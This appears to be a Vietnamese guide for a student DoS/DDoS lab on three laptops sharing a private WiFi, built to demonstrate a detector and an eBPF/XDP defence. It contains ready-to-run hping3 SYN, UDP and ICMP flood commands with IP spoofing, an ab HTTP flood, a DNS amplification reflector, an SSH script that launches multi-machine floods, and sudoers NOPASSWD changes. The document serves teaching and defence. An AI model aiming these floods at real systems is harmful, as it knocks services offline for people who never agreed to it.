# Chạy lab trên NHIỀU MÁY THẬT (qua WiFi / LAN)

Hướng dẫn chạy lab DoS/DDoS bằng các **laptop thật** nối chung 1 WiFi, thay cho (hoặc song song
với) mô hình Docker. Hỗ trợ đầy đủ **Victim Defense Console (cổng 3000)** với 11 đồ thị sóng trực tiếp + thanh gạt phòng thủ IPS, và **Attacker Traffic Generator Web Console (cổng 4000)** giúp phát các bài đo 1-click mà không cần gõ lệnh tay phức tạp trong lúc thuyết trình.

> 📄 **Tài liệu tóm tắt in ấn**: Tham khảo file PDF tóm tắt [`HUONG_DAN_DEMO_3_MAY.pdf`](../HUONG_DAN_DEMO_3_MAY.pdf) được thiết kế tối ưu 2 trang để in ấn hoặc mang theo buổi báo cáo.

> ⚠️ CHỈ DÙNG TRONG LAB CÔ LẬP. Chỉ nhắm vào máy `victim` của chính mình, trên WiFi riêng. Không bao
> giờ nhắm tới máy/dịch vụ không thuộc sở hữu của bạn.

## 0. Bước bắt buộc đầu tiên: Đồng bộ mã nguồn (Trên CẢ 3 Máy)

Trước khi bắt đầu buổi demo, trên CẢ 3 laptop hãy mở terminal và kéo mã nguồn mới nhất về:
```bash
cd ~/dos-ddos-project && git pull origin main
```

## 1. Mô hình 3 máy

```
         WiFi riêng (vd 192.168.1.0/24 qua DHCP hoặc Hotspot 4G)
   +--------------------+   +---------------------+   +---------------------+
   | victim             |   | attacker1           |   | attacker2           |
   | nginx + detector   |   | Traffic Console :4000|  | Traffic Console :4000|
   | SOC Console :3000  |   | DNS Reflector :53   |   |                     |
   +--------------------+   +---------------------+   +---------------------+
```

| Vai trò | Máy | Chạy gì | Cần cài |
|---|---|---|---|
| **victim** | 1 laptop (máy chiếu) | Nginx (:80) + `detector.py` + SOC Console (:3000) | `nginx`, `python3-scapy`, `tcpdump`, `nodejs`, `npm` |
| **attacker1** | 1 laptop | `attacker_dashboard` (:4000) + DNS Reflector BIND9 (:53) | `hping3`, `apache2-utils`, `docker`, `nodejs` |
| **attacker2** | 1 laptop | `attacker_dashboard` (:4000) | `hping3`, `apache2-utils`, `nodejs` |

Bắt đầu với **2 máy** (1 victim + 1 attacker1) là đủ chạy kịch bản A, B, U, I, DNS và C-1-nguồn. Thêm máy
thứ 3 (attacker2) khi cần kịch bản C trở thành DDoS phân tán đa nguồn thật.

## 2. Tìm IP và kiểm tra mạng

Trên MỖI máy, xem IP + tên card WiFi:

```bash
ip -brief addr            # cột 1 = tên card (vd wlan0, wlp2s0); cột 3 = IP (vd 192.168.1.50/24)
```

Card WiFi thường tên `wlan0` hoặc `wlpXsY`. Ghi lại:
- IP victim     = vd `192.168.1.50`
- card victim   = vd `wlan0`
- IP attacker1  = vd `192.168.1.61`

Kiểm tra thông mạng (từ attacker ping victim, và mở web):

```bash
ping -c 3 192.168.1.50                      # phải thấy reply
curl -s -o /dev/null -w '%{http_code}\n' http://192.168.1.50   # phải là 200 (nginx victim sống)
```

Nếu ping không thông: xem mục 11 (gỡ lỗi).

## 3. Phần mềm cần cài

Trên **victim**:
```bash
sudo apt update
sudo apt install -y nginx python3-scapy tcpdump
sudo systemctl enable --now nginx           # nginx phục vụ ở cổng 80
```

Trên **mỗi attacker**:
```bash
sudo apt update
sudo apt install -y hping3 apache2-utils
```

## 4. Deploy repo lên mỗi máy

Mỗi máy cần thư mục `attacks/` (attacker) và `detection/` (victim). Cách đơn giản: clone repo:

```bash
git clone <URL_REPO> ~/dos-ddos-project
```

Mặc định các lệnh bên dưới giả sử repo ở `~/dos-ddos-project`. Nếu clone chỗ khác, đổi tham số
đường dẫn cho phù hợp (và đặt biến `REMOTE_REPO` khi dùng `run_ddos_remote.sh`).

## 5. Chạy detector & Dashboard SOC trên victim

Chạy trong terminal trên máy victim (thay `wlan0` và `192.168.1.100` bằng IP máy bạn):

```bash
cd ~/dos-ddos-project

# Khởi chạy detector kết hợp Dashboard SOC Console thời gian thực:
sudo .venv/bin/python3 detection/detector.py \
    --iface wlan0 \
    --victim 192.168.1.100 \
    --pps 40 --syn 25 \
    --ml detection/window_model.joblib \
    --stream | node dashboard/server.js --victim 192.168.1.100
```

- Mở trình duyệt tại **`http://localhost:3000`** và bấm F11 để chiếu toàn màn hình.
- Giao diện cung cấp: 11 đồ thị sóng trực tiếp (bổ sung cột `DNS/s`), trạng thái Web Service phản hồi realtime, nhật ký sự kiện, và **thanh gạt phòng thủ eBPF/XDP Closed-loop IPS** (`[🛡️ Phòng thủ: BẬT / TẮT]`).

## 6. Khởi chạy Traffic Generator Console & DNS Reflector trên 2 Attacker

Để thao tác nhanh và chuyên nghiệp trong buổi thuyết trình, bạn sử dụng giao diện web **Traffic Generator Console (:4000)** thay vì phải gõ lệnh terminal thủ công:

### 6.1. Trên Laptop Attacker 1 (kiêm DNS Reflector)
```bash
# 1. Bật container DNS Reflector BIND9 cổng 53 (chỉ cần chạy 1 lần):
cd ~/dos-ddos-project/dns && docker run -d --name dns_reflector -p 53:53/udp $(docker build -q .)

# 2. Bật Web Console phát tải:
cd ~/dos-ddos-project/attacker_dashboard && node server.js --port 4000
```

### 6.2. Trên Laptop Attacker 2
```bash
cd ~/dos-ddos-project/attacker_dashboard && node server.js --port 4000
```

### 6.3. Thao tác trên giao diện Web `http://localhost:4000`
1. Nhập **Target Victim IP**: `192.168.1.100` | **Port**: `80`.
2. Nhập **DNS Reflector IP**: `192.168.1.50` (IP của Attacker 1).
3. Bấm **[🔍 Kiểm tra Kết nối]**: Đèn xanh `🟢 SẴN SÀNG: Ping OK | HTTP 200 OK` báo hiệu thông mạng.
4. Bấm 1-click vào các nút kịch bản để phát tải:
   - **Kịch bản A (SYN Direct)**: DoS 1 nguồn.
   - **Kịch bản B (SYN Spoofed)**: DDoS giả mạo IP nguồn ngẫu nhiên.
   - **Kịch bản C (HTTP Paced)**: DDoS HTTP L7.
   - **Kịch bản U (UDP Flood)**: DoS/DDoS volumetric UDP.
   - **Kịch bản I (ICMP Flood)**: DoS/DDoS ping flood.
   - **Kịch bản DNS (DNS Amp)**: Phản xạ khuếch đại DNS dội về victim.
5. Khi kết thúc kịch bản, bấm nút đỏ **[🛑 STOP ALL TRAFFIC]** để dừng ngay lập tức.

*(Lưu ý: Nếu vẫn muốn dùng dòng lệnh thủ công thay cho Web Console, bạn có thể tham khảo các lệnh `hping3` và `ab` ở mục 8 bên dưới).*

## 7. Kịch bản Trình diễn 4 Pha trước Hội đồng (Presentation Playbook)

| Pha | Hành động 2 Attacker | Hiện tượng trên Màn hình Victim (Máy chiếu) |
|---|---|---|
| **Pha 1: Baseline** | Chưa phát tải. | Banner xanh `BENIGN`, 11 đồ thị 0–10 pps, Web: `UP (200) 1ms`. Thanh gạt `[🛡️ Phòng thủ: TẮT]`. |
| **Pha 2: DoS đơn nguồn** | Attacker 1 bấm `[Kịch bản A: SYN Direct]`. | Banner cam `DoS [SYN flood]`, `n_src = 1`, `H(src) ≈ 0.00`. AI ML & Rule cùng bắt đúng. Sau đó bấm `[STOP ALL TRAFFIC]` hạ nhiệt về `BENIGN`. |
| **Pha 3: DDoS đa nguồn & DNS Amp** | Attacker 1 bấm `[B: SYN Spoofed]`, Attacker 2 bấm `[C: HTTP Paced]` hoặc `[DNS Amp]`. | Banner đỏ rực `DDoS`, `n_src` tăng hàng trăm/nghìn IP, `H(src) > 7–8 bits`, cột `DNS/s` tăng vọt, Web Service bị nghẽn (`SLOW` / `TIMEOUT`). |
| **Pha 4: Bật Phòng thủ IPS (Đắt giá)** | 2 Attacker vẫn đang bắn DDoS. | Ngay trên máy chiếu, dùng chuột **gạt thanh trượt [🛡️ Phòng thủ: BẬT]** &rarr; eBPF kích hoạt `XDP_DROP` tại card mạng, `drop/s` nhảy vọt, Web Service lập tức hồi sinh: **`UP (200) 1ms`** trước mắt Thầy Cô! |

---

## 8. Các lệnh Terminal thủ công (Tùy chọn thay thế cho Web Console)

Nếu không sử dụng giao diện web Traffic Generator Console (:4000), bạn có thể chạy các lệnh kiểm thử thủ công trực tiếp trên terminal của máy Attacker:

### A — DoS TCP SYN Flood (1 nguồn)
```bash
sudo hping3 -S -p 80 -i u2000 192.168.1.50
```
Detector: `n_src=1` → **DoS** `[SYN flood]`. Thêm `--flood` nếu muốn tốc độ tối đa.

### B — DDoS TCP SYN Flood (IP Spoofing hoặc 2 máy cùng bắn)
```bash
# 1 máy dùng spoof ngẫu nhiên IP:
sudo hping3 -S -p 80 --rand-source -i u2000 192.168.1.50
# Hoặc cả Attacker 1 và Attacker 2 cùng chạy lệnh ở kịch bản A.
```
Detector: nhiều IP nguồn → `n_src>=2`, Entropy $H(src)$ cao → **DDoS** `[SYN flood]`.

### C — DDoS L7 HTTP Flood (Apache Benchmark)
```bash
ab -k -c 50 -n 30000 http://192.168.1.50/
```
HTTP là kết nối TCP thật. Khi cả 2 máy attacker cùng chạy lệnh này: `n_src=2` → hiện **DDoS** `[HTTP Flood (L7)]`. Web service latency tăng vọt. `ab` KHÔNG cần quyền `sudo`.

### D — UDP Flood (L4 Volumetric)
```bash
# DoS (1 nguồn):
sudo hping3 --udp -p 80 -i u2000 192.168.1.50
# DDoS (cả 2 máy cùng bắn hoặc thêm --rand-source):
sudo hping3 --udp -p 80 --rand-source -i u2000 192.168.1.50
```
Detector: `pps` cao, **`udp_s` cao**, `syn/s` và `ack/s` ~0 → tag **`[UDP flood]`**.

### E — ICMP Echo Flood (Ping Flood L3)
```bash
# DoS (1 nguồn):
sudo hping3 --icmp -i u2000 192.168.1.50
# Hoặc dùng ping flood chuẩn Linux:
sudo ping -f -s 1024 192.168.1.50
# DDoS (cả 2 máy cùng bắn hoặc thêm --rand-source):
sudo hping3 --icmp --rand-source -i u2000 192.168.1.50
```
Detector: `pps` cao nhưng `SYN=0, ACK=0, UDP=0` → nhận diện **`[ICMP Flood (L3)]`**.

> LƯU Ý (volumetric trong lab): nginx chỉ phục vụ TCP cổng 80, **không xử lý UDP**, nên gói UDP tới
> victim bị kernel bỏ (hoặc trả ICMP port-unreachable). Trong lab WiFi băng thông thừa, UDP flood
> **không làm sập** victim — nó minh họa **nhận dạng** loại tấn công volumetric (tag `[UDP flood]`),
> không phải gây sập. Muốn thật sự nghẽn phải bão hòa băng thông đường truyền (quy mô lớn hơn nhiều).

## 9. Chạy nhiều attacker cùng lúc bằng `run_ddos_remote.sh`

`run_ddos_remote.sh` (ở gốc repo) bắn SONG SONG từ nhiều máy attacker qua SSH. Đặt và chạy trên máy
ĐIỀU KHIỂN (tiện nhất là chính máy victim — nó đã có repo).

### 9.1. Tạo SSH key một lần (để không bị hỏi mật khẩu lúc bắn song song)
Trên máy điều khiển:
```bash
ssh-keygen -t ed25519            # Enter hết; tạo key nếu chưa có
ssh-copy-id user@192.168.1.61    # lặp lại cho mỗi attacker
ssh-copy-id user@192.168.1.62
ssh user@192.168.1.61 true       # kiểm tra: vào được không cần mật khẩu
```

### 9.2. Chạy
```bash
# 1 attacker, SYN:
./run_ddos_remote.sh syn  -t 192.168.1.50 -d 30 -a user@192.168.1.61

# 2 attacker, HTTP (DDoS L7 thật, n_src=2):
./run_ddos_remote.sh http -t 192.168.1.50 -d 30 -a user@192.168.1.61 -a user@192.168.1.62

# UDP flood (volumetric, cần raw socket giống SYN — xem mục 10):
./run_ddos_remote.sh udp  -t 192.168.1.50 -d 30 -a user@192.168.1.61

# thêm máy thứ 3 sau này: chỉ thêm 1 cờ -a nữa
./run_ddos_remote.sh http -t 192.168.1.50 -d 30 -a user@192.168.1.61 -a user@192.168.1.62 -a user@192.168.1.63
```
Các cờ: `-t` IP victim, `-d` giây, `-a` user@ip (lặp lại), `-r` pps/nguồn cho SYN và UDP (mặc định
400), `-s` thêm sudo cho SYN/UDP (chỉ khi dùng NOPASSWD sudoers thay vì CAP_NET_RAW — mục 10). Repo
trên máy attacker mặc định `~/dos-ddos-project`; đổi bằng biến `REMOTE_REPO=/đường/dẫn ./run_ddos_remote.sh ...`.

## 10. Quyền hạn khi chạy hping3 (sudo / raw socket)

`hping3` mở raw socket để tạo gói L3/L4 nên cần quyền root (`sudo`). `ab` là HTTP client tầng ứng dụng thông thường nên KHÔNG cần sudo.

- **Chạy trực tiếp bằng tay trên máy attacker:** Thêm `sudo` trước lệnh `hping3`: `sudo hping3 ...`
- **Bắn tự động qua SSH (`run_ddos_remote.sh`):** Cần cấp quyền chạy hping3 không hỏi mật khẩu:
```bash
# Trên máy attacker:
sudo setcap cap_net_raw+eip "$(command -v hping3)"
# Hoặc thêm vào sudoers:
echo "$USER ALL=(root) NOPASSWD: /usr/sbin/hping3, /usr/bin/hping3" | sudo tee /etc/sudoers.d/dos-lab
sudo chmod 440 /etc/sudoers.d/dos-lab
```
Rồi bắn kèm `-s`: `./run_ddos_remote.sh syn ... -s`. Cách này cũng nới quyền (cho chạy python3 bất
kỳ dưới root không mật khẩu) → chỉ dùng trên máy lab, gỡ file sudoers khi xong.

## 11. Khác biệt so với Docker

- **Sniff NIC thật:** detector sniff thẳng card WiFi (`--iface wlan0`), không dùng chung namespace
  như Docker. Không còn vấn đề "SYN-ACK của victim bị đếm thành nguồn" theo kiểu netns — nhưng bộ lọc
  `--victim <ip>` vẫn cần để loại gói victim tự trả về.
- **XDP:** trong Docker chạy XDP-generic trên veth. Trên máy thật, card có dây (eth0) có thể chạy
  XDP native (nhanh hơn); card WiFi thường KHÔNG hỗ trợ XDP native → dùng `scapy` (mặc định) cho an
  toàn.
- **Không có orchestrator Docker:** `run_ddos.sh`, `experiments/run_scenarios.py`, `dashboard/` đều
  dùng `docker exec` → KHÔNG dùng cho máy thật. Máy thật dùng Traffic Generator Console hoặc `run_ddos_remote.sh`.
- **IP động (DHCP):** mọi IP truyền qua tham số lúc chạy; không đặt IP tĩnh, không netplan.

## 12. An toàn & gỡ lỗi thường gặp

- **Chỉ nhắm victim của mình, WiFi riêng.** Không nhắm IP lạ.
- **ping không thông:** cùng WiFi chưa? AP bật "AP/client isolation" (chặn máy-tới-máy)? Tắt tính
  năng đó trên router, hoặc dùng một AP/hotspot khác.
- **curl victim không ra 200:** nginx chưa chạy (`sudo systemctl status nginx`), hoặc firewall chặn
  cổng 80 (`sudo ufw status`; lab thì có thể `sudo ufw disable`).
- **hping3 báo Operation not permitted:** quên `sudo` (chạy tay), hoặc chưa cấu
  hình CAP_NET_RAW/NOPASSWD (khi qua SSH) — xem mục 9.
- **B không ra nhiều nguồn (n_src~1):** AP lọc gói spoof (bình thường trên WiFi) → dùng nhiều
  attacker thật thay vì spoof.
- **detector in pps=0 khi đang bị tấn công:** sai `--iface` (không phải card đang nhận traffic) hoặc
  sai `--victim` (IP victim đổi do DHCP) → chạy lại `ip -brief addr` lấy IP/card đúng.
- **run_ddos_remote.sh báo không SSH được:** chưa `ssh-copy-id` tới máy đó, hoặc sai `user@ip`.
- **Còn sót tiến trình sau khi chạy:** `ssh user@ip 'pkill hping3; pkill -f http_flood.py'` (hoặc
  `pkill hping3; pkill -f http_flood.py` trên máy chạy tay).
